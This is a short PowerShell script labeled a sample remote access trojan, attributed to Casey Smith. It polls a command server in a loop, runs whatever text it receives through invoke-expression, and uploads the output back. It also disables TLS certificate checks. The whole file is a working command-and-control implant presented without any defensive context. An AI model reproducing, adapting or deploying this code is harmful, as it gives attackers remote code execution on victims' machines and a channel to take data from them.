# Sample PowerShell RAT
# Casey Smith
# 06-04-2014
# 

$server = "https://127.0.0.1:8082/rat"
$wc = New-Object Net.WebClient
while($true)
{
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
$result = $wc.DownloadString("$server")
while($result) {
	$output = invoke-expression $result | out-string 
	$wc.UploadString("$server", $output)	
	break
}
}
